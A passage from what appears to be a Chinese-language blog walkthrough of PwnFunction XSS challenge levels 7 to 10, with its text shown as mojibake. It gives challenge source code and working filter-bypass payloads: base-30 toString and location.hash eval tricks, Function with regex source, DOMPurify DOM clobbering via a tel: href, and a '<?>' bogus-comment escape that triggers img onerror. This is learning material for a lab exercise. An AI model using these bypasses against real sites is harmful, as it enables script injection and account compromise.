%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%2B%5B%2B%21%2B%5B%5D%5D%5D%2B%5B%2B%21%2B%5B%5D%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%2B%28%5B%5D%2B%5B%5D%2B%5B%5D%5B%28%21%5B%5D%2B%5B%5D%29%5B%2B%21%2B%5B%5D%5D%2B%28%21%21%5B%5D%2B%5B%5D%29%5B%2B%5B%5D%5D%5D%29%5B%2B%21%2B%5B%5D%2B%5B%21%2B%5B%5D%2B%21%2B%5B%5D%5D%5D%29</span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714173304760.png" alt="image-20250714173304760"></p>
<p>åé¢æˆ‘ä»¬åœ¨ ç ”ç©¶ä¸€ä¸‹<code>jsfuck</code> åˆ°åº•ä¸ºä»€ä¹ˆå¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼æ¥ç¼–ç </p>
<h5 id="ç¬¬ä¸ƒå…³"><a href="#ç¬¬ä¸ƒå…³" class="headerlink" title="ç¬¬ä¸ƒå…³"></a>ç¬¬ä¸ƒå…³</h5><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714173438672.png" alt="image-20250714173438672"></p>
<p>æºç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mafia = (new URL(location).searchParams.get(&#x27;mafia&#x27;) || &#x27;1+1&#x27;)</span><br><span class="line">mafia = mafia.slice(0, 50)</span><br><span class="line">mafia = mafia.replace(/[\`\&#x27;\&quot;\+\-\!\\\[\]]/gi, &#x27;_&#x27;)</span><br><span class="line">mafia = mafia.replace(/alert/g, &#x27;_&#x27;)</span><br><span class="line">eval(mafia)</span><br></pre></td></tr></table></figure>

<p>åˆ†æ</p>
<p>è¿™é‡Œé™åˆ¶äº†æˆ‘ä»¬payloadçš„é•¿åº¦ä¸èƒ½è¶…è¿‡50ï¼Œä¸”è¿‡æ»¤äº†&#96;&#96;â€™ â€œ + - ! \ [ ]&#96; æ‰€ä»¥è¿™å…³å®Œå…¨é™åˆ¶äº†ä¸Šä¸€å…³çš„æ–¹æ³•</p>
<p>è€Œä¸”ä»–è¿˜è¿‡æ»¤äº† alert æ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ç”¨alert ä½†æ˜¯æˆ‘ä»¬è¿˜æœ‰å¦å¤–ä¸¤ä¸ªå¯ä»¥ç”¨</p>
<p><code>confirm()ã€prompt()</code></p>
<p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åˆ©ç”¨ï¼Œä½†æ˜¯è¿˜æœ‰å…¶ä»–çš„åŠæ³•</p>
<h6 id="ç¬¬ä¸€ç§æ–¹æ³•"><a href="#ç¬¬ä¸€ç§æ–¹æ³•" class="headerlink" title="ç¬¬ä¸€ç§æ–¹æ³•"></a>ç¬¬ä¸€ç§æ–¹æ³•</h6><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="number">8680439.</span>.<span class="title function_">toString</span>(<span class="number">30</span>))(<span class="number">1337</span>)</span><br></pre></td></tr></table></figure>

<p><code>..toString()</code> å¯ä»¥å°†æ•°å­—è½¬æ¢ä¸ºå­—ç¬¦</p>
<p>8680439ï¼šå…¶å®å°±æ˜¯ 30è¿›åˆ¶çš„alert</p>
<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714174146435.png" alt="image-20250714174146435"></p>
<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714174200405.png" alt="image-20250714174200405"></p>
<p>è¿™é‡Œæˆ‘ä»¬å°±æ˜¯åˆ©ç”¨ è¿™ä¸ªå‡½æ•°</p>
<p>é‚£ä¸ºä»€ä¹ˆæ˜¯30è¿›åˆ¶ä¸æ˜¯ å…¶ä»–è¿›åˆ¶ å‘¢ï¼Ÿ</p>
<p>æˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹29è¿›åˆ¶</p>
<p>åˆ©ç”¨<code>parseInt()</code> æ¥çœ‹ä¸€ä¸‹ è½¬æ¢alertæ˜¯ä»€ä¹ˆ</p>
<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714174909597.png" alt="image-20250714174909597"></p>
<p>è¿™é‡Œå¯ä»¥çœ‹åˆ° alert çš„ t è½¬æ¢å›æ¥æ¶ˆå¤±äº†ï¼ï¼ï¼ </p>
<p>ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ</p>
<p>A B C D E F G H I J K L M N O P Q R S T </p>
<p>è¿™é‡Œæˆ‘ä»¬çŸ¥é“A æ˜¯10è¿›åˆ¶å¯ä»¥è¿›è¡Œè½¬æ¢<br>T åœ¨ç¬¬30ä½ï¼Œæˆ‘ä»¬åˆç†çš„è¿›è¡Œæ¨æµ‹ï¼ŒT æ˜¯ä¸æ˜¯å°±æ˜¯30è¿›åˆ¶å‘¢ï¼Ÿ</p>
<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714175135098.png" alt="image-20250714175135098"></p>
<p>æ‰€ä»¥æˆ‘30~36éƒ½å¯ä»¥è¿›è¡Œè½¬æ¢t</p>
<p>é‚£ä¹ˆæˆ‘ä»¬è¿™ä¸ªpayload <code>eval(8680439..toString(30))(1337)</code>å°±å®Œå…¨å¯ä»¥ç»•è¿‡è¿‡æ»¤ï¼Œå®ç°<code>xss</code></p>
<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714175432982.png" alt="image-20250714175432982"></p>
<h6 id="ç¬¬äºŒç§æ–¹æ³•"><a href="#ç¬¬äºŒç§æ–¹æ³•" class="headerlink" title="ç¬¬äºŒç§æ–¹æ³•"></a>ç¬¬äºŒç§æ–¹æ³•</h6><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(location.<span class="property">hash</span>.<span class="title function_">slice</span>(<span class="number">1</span>))</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ¸…æ¥šçš„ç†è§£åˆ° æ˜¯é€šè¿‡ <code>location.hash.slice(1)</code> è¿™ä¸ªå‡½æ•°æ¥ä¼ å€¼ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡#æ¥æ’å…¥æˆ‘ä»¬çš„æ¶æ„ä»£ç ï¼Œä½†æ˜¯æˆ‘ä»¬çš„xssä»£ç å¹¶ä¸ä¼šè¿›å…¥æ­£åˆ™è¿‡æ»¤ä¸­</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?mafia=eval(location.hash.slice(1))#alert(1337)</span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714175631542.png" alt="image-20250714175631542"></p>
<h6 id="ç¬¬ä¸‰ç§æ–¹æ³•"><a href="#ç¬¬ä¸‰ç§æ–¹æ³•" class="headerlink" title="ç¬¬ä¸‰ç§æ–¹æ³•"></a>ç¬¬ä¸‰ç§æ–¹æ³•</h6><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Function</span>(<span class="regexp">/ALERT(1337)/</span>.<span class="property">source</span>.<span class="title function_">toLowerCase</span>())()</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºjsæ˜¯ä¸¥æ ¼åŒºåˆ†å¤§å°å†™çš„ æ‰€ä»¥æˆ‘ä»¬ä¼ å…¥çš„<code>ALERT</code>  å¹¶ä¸ä¼šè¢«è¿‡æ»¤ï¼Œæˆ‘ä»¬å°±è¦æƒ³åŠæ³•å°†ä»–è½¬ä¸ºå°å†™</p>
<p>è¿™é‡Œæˆ‘ä»¬æŸ¥å®˜æ–¹æ–‡æ¡£äº†è§£ä¸€ä¸‹<code>Function()</code>çš„ä½œç”¨</p>
<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714175931432.png" alt="image-20250714175931432"></p>
<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714180008622.png" alt="image-20250714180008622"></p>
<p>Function()æ˜¯æ„é€ å‡½æ•°</p>
<p>åœ¨çœ‹çœ‹.source æ˜¯å•¥</p>
<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714180718828.png" alt="image-20250714180718828"></p>
<p>è¿”å›æ­£åˆ™è¡¨è¾¾å¼çš„æ–‡æœ¬å†…å®¹ï¼ˆå³ <code>/pattern/flags</code> ä¸­çš„ <code>pattern</code> éƒ¨åˆ†ï¼‰ï¼Œä¸åŒ…å«åˆ†éš”ç¬¦å’Œæ ‡å¿—ã€‚</p>
<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714180844540.png" alt="image-20250714180844540"></p>
<p>.toLowerCase()è½¬å°å†™</p>
<p>è¿™ä¸ªpayloadæˆ‘ä»¬å°±çŸ¥é“å…ˆé€šè¿‡Function æ„é€ å‡½æ•° ç„¶å ä¼ å…¥ <code>/ALERT(1337)/</code> é€šè¿‡.source è·å–åˆ°<code>ALERT(1337</code> åœ¨é€šè¿‡ <code>toLowerCase()</code> è½¬æˆå°å†™ ï¼Œæœ€å<code>()</code>ç«‹å³æ‰§è¡Œ</p>
<p>è¿™ä¸ªpayloadçš„å¥½å¤„æ˜¯æˆ‘ä»¬å¯ä»¥ç»•è¿‡ä»–çš„å…³é”®å­—åŒ¹é…ï¼Œæ„é€ è‡ªå·±çš„å‡½æ•°</p>
<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714181507067.png" alt="image-20250714181507067"></p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Function(/ALERT(1337)/.source.toLowerCase())()</span><br></pre></td></tr></table></figure>

<h5 id="ç¬¬å…«å…³"><a href="#ç¬¬å…«å…³" class="headerlink" title="ç¬¬å…«å…³"></a>ç¬¬å…«å…³</h5><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714181615220.png" alt="image-20250714181615220"></p>
<p>æºç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2 id=&quot;boomer&quot;&gt;Ok, Boomer.&lt;/h2&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    boomer.innerHTML = DOMPurify.sanitize(new URL(location).searchParams.get(&#x27;boomer&#x27;) || &quot;Ok, Boomer&quot;)</span><br><span class="line">    setTimeout(ok, 2000)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>åˆ†æ</p>
<p>è¿™é‡Œä»–å¼•å…¥äº†<code>DOMPurify</code>é˜²å¾¡ç”¨æˆ·è¾“å…¥æ¡†æ¶ï¼Œè¿™ä¸ªæ¡†æ¶è‡³ä»Šéƒ½åœ¨ç»´æŠ¤ï¼Œè€Œä¸”ç»•è¿‡çš„æ¦‚ç‡å¾ˆä½ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸è€ƒè™‘ç»•è¿‡çš„æ–¹æ³•</p>
<p>çœ‹åˆ°ä¸‹é¢<code>setTimeout(ok, 2000)</code> è¿™é‡Œçš„<code>ok</code>å¹¶æ²¡æœ‰è¿›è¡Œå®šä¹‰</p>
<p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>dom clobbering</code>ç§°ä¹‹ä¸º<code>dom</code>ç ´åæŠ€æœ¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a id=ok href=javasCript:alert(1337)&gt;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å°è¯•ä¼ å…¥è¿™ä¸ªæ¥é‡æ–°æ„é€ okå‡½æ•°</p>
<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250715113259686.png" alt="image-20250715113259686"></p>
<p>ä½†æ˜¯å‘ç°è¢«æ¡†æ¶è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬å»githubä¸Šçœ‹ä¸€ä¸‹ï¼Œæ‰¾ä¸€ä¸‹ç™½åå•</p>
<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250715113345829.png" alt="image-20250715113345829"></p>
<p><code>/^(?:(?:(?:f|ht)tps?|mailto|tel|callto|sms|cid|xmpp|matrix):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))</code></p>
<p>è¿™é‡Œæµ‹è¯•å‘ç° </p>
<p><code>mailto|tel|callto|sms|cid|xmpp|matrix</code></p>
<p>å…¨éƒ¨éƒ½èƒ½å¤Ÿè§¦å‘alert</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?boomer=&lt;a id=ok href=&quot;tel:alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250714183323651.png" alt="image-20250714183323651"></p>
<p>é‚£ä¹ˆä¸ºä»€ä¹ˆæˆ‘ä»¬ä¼šæƒ³åˆ°ç”¨Aæ ‡ç­¾å‘¢ï¼Ÿ</p>
<p>1.æˆ‘ä»¬éœ€è¦ä¼ å…¥ä¸€ä¸ªæˆ‘ä»¬å¯æ§å¾—å­—ç¬¦ï¼Œä¸”ä»–èƒ½è¢«<code>setTimeout</code> æ‰§è¡Œ</p>
<p>toString </p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹ä»£ç æ¥è¿›â¾fuzzå¾—åˆ°å¯ä»¥é€šè¿‡<code>toString</code>â½…æ³•å°†å…¶è½¬æ¢æˆå­—ç¬¦ä¸²ç±»å‹çš„æ ‡ç­¾ï¼š </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Object.getOwnPropertyNames(window)</span><br><span class="line">.filter(p =&gt; p.match(/Element$/))</span><br><span class="line">.map(p =&gt; window[p])</span><br><span class="line">.filter(p =&gt; p &amp;&amp; p.prototype &amp;&amp; p.prototype.toString</span><br><span class="line">!== Object.prototype.toString) </span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥å¾—åˆ°ä¸¤ç§æ ‡ç­¾å¯¹è±¡ï¼š<code>HTMLAreaElement ()</code>&amp; <code>HTMLAnchorElement ()</code>ï¼Œè¿™ä¸¤ä¸ª æ ‡ç­¾å¯¹è±¡æˆ‘ä»¬éƒ½å¯ä»¥åˆ©â½¤hrefå±æ€§æ¥è¿›â¾å­—ç¬¦ä¸²è½¬æ¢ã€‚</p>
<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250715114025687.png" alt="image-20250715114025687"></p>
<p><code>HTMLAreaElement</code>  æ˜¯<code>area</code>ä½†æ˜¯ä»–æ˜¯ä¸€ä¸ªç©ºå…ƒç´ ä¸èƒ½å®¹çº³ä»»ä½•å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸è€ƒè™‘</p>
<p>é‚£ä¹ˆå°±åªå‰©ä¸‹<code>HTMLAnchorElement</code>  è¿™ä¸ªçš„æ„æ€æ˜¯é”šç‚¹çš„æ„æ€ï¼Œ</p>
<p>ä¹Ÿå°±æ˜¯è·³è½¬ï¼Œhtmlä¸­å“ªä¸ªæ ‡ç­¾å¯ä»¥è·³è½¬å®ç°å‘¢ï¼Ÿ</p>
<p>ç­”æ¡ˆå‘¼ä¹‹æ¬²å‡ºäº†ï¼šAæ ‡ç­¾çš„ hrefå±æ€§ </p>
<p>æ‰€ä»¥è¿™é‡Œdomç ´åå°±æ˜¯åœ¨aæ ‡ç­¾çš„herfå±æ€§ä¸Šä¼ å…¥æˆ‘ä»¬çš„xssä»£ç ï¼</p>
<h5 id="ç¬¬ä¹å…³"><a href="#ç¬¬ä¹å…³" class="headerlink" title="ç¬¬ä¹å…³"></a>ç¬¬ä¹å…³</h5><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250715172949724.png" alt="image-20250715172949724"></p>
<p>æºç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- Challenge --&gt;</span><br><span class="line">&lt;div id=&quot;pwnme&quot;&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var input = (new URL(location).searchParams.get(&#x27;debug&#x27;) || &#x27;&#x27;).replace(/[\!\-\/\#\&amp;\;\%]/g, &#x27;_&#x27;);</span><br><span class="line">    var template = document.createElement(&#x27;template&#x27;);</span><br><span class="line">    template.innerHTML = input;</span><br><span class="line">    pwnme.innerHTML = &quot;&lt;!-- &lt;p&gt; DEBUG: &quot; + template.outerHTML + &quot; &lt;/p&gt; --&gt;&quot;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>åˆ†æ</p>
<p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå¯¹getä¼ å‚<code>debug</code>è¿›è¡Œäº†è¿‡æ»¤</p>
<p>å°† <code>! - / # &amp; ; %</code>  è¿›è¡Œäº†è¿‡æ»¤</p>
<p>é‚£æˆ‘ä»¬ç°åœ¨è€ƒè™‘ï¼Œåœ¨å“ªä¸ªåœ°æ–¹å¯ä»¥åˆ©ç”¨è¿›è¡Œdomç ´åå‘¢ï¼Ÿ</p>
<p>æˆ‘ä»¬çŸ¥é“å½¢å¦‚ <code>document.x</code> è¿™ç§æˆ‘ä»¬éƒ½å¯ä»¥è¿›è¡Œdomç ´å</p>
<p>è¿™é‡Œæˆ‘ä»¬å¾ˆå®¹æ˜“å°±å‘ç° <code>template.outerHTML</code>ï¼Œä½†æ˜¯è¢«<code>&lt;!--</code> <code>--&gt;</code> åŒ…è£¹ï¼Œè€Œä¸”ä¸ºå¤šè¡Œæ³¨é‡Šï¼Œé‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•è¿›è¡Œç»•è¿‡å‘¢ï¼Ÿ</p>
<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250718194412725.png" alt="image-20250718194412725"></p>
<p>æˆ‘ä»¬å…ˆä¸è€ƒè™‘æ³¨é‡Šç¬¦ï¼Œæ­£å¸¸æ’å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&#x27;1&#x27; onerror=&#x27;alert(1)&#x27;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250718210013062.png" alt="image-20250718210013062"></p>
<p>å‘ç°æ­£å¦‚æˆ‘ä»¬é¢„æ–™çš„ä¸€æ ·ï¼Œæˆ‘ä»¬çš„payloadè¢«æ³¨é‡Šæ‰äº†</p>
<p>é‚£æˆ‘ä»¬å°±è¦æ€è€ƒå¦‚ä½•æ¥é—­åˆ <code>&lt;!--</code></p>
<p>ç»è¿‡æŸ¥æ‰¾å¤§é‡èµ„æ–™å‘ç°ï¼Œ<code>&lt;?</code>å¯ä»¥æŠŠpæ ‡ç­¾é€ƒé€¸å‡ºæ¥</p>
<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250718210214704.png" alt="image-20250718210214704"></p>
<p>é‚£ä¹ˆè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ</p>
<p>ä¸‹æ–­è°ƒè¯•çœ‹çœ‹</p>
<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250718211205269.png" alt="image-20250718211205269"></p>
<p>å‘ç° æˆ‘ä»¬ä¼ å…¥çš„<code>&lt;?</code> å˜ä¸ºäº†<code> &lt;!--?--&gt;</code> è¿™æ ·ä»–è¿›å…¥</p>
<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250718211335880.png" alt="image-20250718211335880"></p>
<p>å°±æŠŠPæ ‡ç­¾é€ƒé€¸å‡ºæ¥äº†</p>
<p>æ ¹æ®w3c</p>
<p>è§„èŒƒæ–‡æ¡£ï¼Œå¯ä»¥åœ¨ä»¥ä¸‹é“¾æ¥æ‰¾åˆ°ï¼š</p>
<p>ğŸ”— <strong>HTML Standard - Parsing HTML Documents</strong><br>ğŸ”— <a target="_blank" rel="noopener" href="https://html.spec.whatwg.org/multipage/parsing.html#parsing-html-documents">https://html.spec.whatwg.org/multipage/parsing.html#parsing-html-documents</a></p>
<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250718232910418.png" alt="image-20250718232910418"></p>
<p>å½“é‡åˆ°<code>&lt;</code> å·çš„æ—¶å€™ ä¼šåˆ‡æ¢åˆ° æ ‡ç­¾å¼€å§‹çŠ¶æ€   <a target="_blank" rel="noopener" href="https://html.spec.whatwg.org/multipage/parsing.html#tag-open-state">tag open state</a>.</p>
<p>ç„¶å</p>
<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250718233511852.png" alt="image-20250718233511852"></p>
<p>åˆå› ä¸ºä¸‹ä¸€ä¸ªå­—ç¬¦æ˜¯<code>?</code> ä»–ä¼šè¿›å…¥ <a target="_blank" rel="noopener" href="https://html.spec.whatwg.org/multipage/parsing.html#bogus-comment-state">bogus comment state</a>.</p>
<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250718233648645.png" alt="image-20250718233648645"></p>
<p>ç„¶å ä¸‹ä¸€ä¸ªå­—ç¬¦æ˜¯ <strong>Anything else</strong>  å°†å½“å‰è¾“å…¥å­—ç¬¦é™„åŠ åˆ°æ³¨é‡Šæ ‡è®°çš„æ•°æ®ä¸­ã€‚ä¹Ÿå°±æ˜¯<code>&lt;!--?--&gt;</code>,</p>
<p>è¿™é‡Œä¸¾ä¸ªåˆ—å­ï¼šè¾“å…¥æ˜¯aaa&lt;?bbb&gt;cccçš„æ—¶å€™ï¼Œè§£æåˆ°ç¬¬ i ä¸ªå­—ç¬¦æ—¶ï¼ŒinnerHTML çš„ç»“æœæ˜¯è¿™æ ·çš„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a</span><br><span class="line">aa</span><br><span class="line">aaa</span><br><span class="line">aaa&lt;</span><br><span class="line">aaa&lt;!--?--&gt;</span><br><span class="line">aaa&lt;!--?b--&gt;</span><br><span class="line">aaa&lt;!--?bb--&gt;</span><br><span class="line">aaa&lt;!--?bbb--&gt;</span><br><span class="line">aaa&lt;!--?bbb--&gt;</span><br><span class="line">aaa&lt;!--?bbb--&gt;c</span><br><span class="line">aaa&lt;!--?bbb--&gt;cc</span><br><span class="line">aaa&lt;!--?bbb--&gt;ccc</span><br></pre></td></tr></table></figure>

<p>ç›´åˆ°è¯¥çŠ¶æ€é‡åˆ°äº†&gt;ä¸ºæ­¢ï¼Œå›åˆ° data stateã€‚æ³¨æ„è¿™ä¸ª Bogus comment state è§£æåˆ°&gt;çš„æ—¶å€™ä¼šç›´æ¥å›åˆ° data stateï¼Œä¹Ÿå°±æ˜¯ HTML parser æœ€å¼€å§‹è§£æçš„çŠ¶æ€ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥æ’å…¥ HTML ä»£ç äº†ã€‚</p>
<p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è¯•ç€ä¼ å€¼æµ‹è¯•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?&gt;&lt;img src=&#x27;1&#x27; onerror=&#x27;alert(1)&#x27;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250718234143650.png" alt="image-20250718234143650"></p>
<p>ä¹Ÿæ˜¯æˆåŠŸå¼¹çª—äº†ï¼Œæˆ‘ä»¬å†æ¬¡æ‰“æ–­ç‚¹çœ‹çœ‹å…·ä½“æ˜¯ä»€ä¹ˆæµç¨‹</p>
<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250718234243274.png" alt="image-20250718234243274"></p>
<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250718234255751.png" alt="image-20250718234255751"></p>
<p>ä¸æˆ‘ä»¬çš„é¢„æƒ³å®Œå…¨ä¸€è‡´</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?&gt;&lt;svg onload=alert(1)&gt;</span><br><span class="line">&lt;?&gt;&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸¤ä¸ªéƒ½å¯ä»¥ï¼Œä½†æ˜¯åˆ‡è®°ä¸è¦ç”¨<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p>åŸå› å°±æ˜¯<code>/</code> è¢«è¿‡æ»¤äº†ï¼Œå°±ç®—æ²¡è¢«è¿‡æ»¤ä¹Ÿä¸ä¼šè¢«æ‰§è¡Œ</p>
<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250718235939727.png" alt="image-20250718235939727"></p>
<p>w3cæ–‡æ¡£æ¸…æ¥šçš„è¿›è¡Œäº†è¯´æ˜</p>
<p><code>document.write()</code> <code>script </code> <code>innerHTML</code>  <code>outerHTML</code> </p>
<p><em>ä½¿ç”¨è¯¥æ–¹æ³•æ’å…¥æ—¶ï¼Œå…ƒç´ é€šå¸¸ä¼šæ‰§è¡Œï¼ˆé€šå¸¸ä¼šé˜»æ­¢è¿›ä¸€æ­¥çš„è„šæœ¬æ‰§è¡Œæˆ– HTML è§£æï¼‰ã€‚å½“ä½¿ç”¨ å’Œ å±æ€§æ’å…¥æ—¶ï¼Œå®ƒä»¬æ ¹æœ¬ä¸ä¼šæ‰§è¡Œã€‚</em></p>
<p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250719000131057.png" alt="image-20250719000131057"></p>
<p>è¿™é‡Œä»–ä¹Ÿè¯´æ˜äº† <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/innerHTML">å®˜æ–¹æ–‡æ¡£</a></p>
<h5 id="ç¬¬åå…³"><a href="#ç¬¬åå…³" class="headerlink" title="ç¬¬åå…³"></a>ç¬¬åå…³</h5><p><img src="/2025/07/14/XSS-DOM%E7%A0%B4%E5%9D%8F/image-20250719000937250.png" alt="image-20250719000937250"></p>
<p>æºç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;number id=&quot;number&quot; style=&quot;display:none&quot;&gt;&lt;/number&gt;</span><br><span class="line">&lt;div class=&quot;alert alert-primary&quot; role=&quot;alert&quot; id=&quot;welcome&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;button id=&quot;keanu&quot; class=&quot;btn btn-primary btn-sm&quot; data-toggle=&quot;popover&quot; data-content=&quot;DM @PwnFunction&quot;</span><br><span class="line">    data-trigger=&quot;hover&quot; onclick=&quot;alert(`If you solved it, DM me @PwnFunction :)`)&quot;&gt;Solved it?&lt;/button&gt;</span><br><span class="line">    </span><br><span 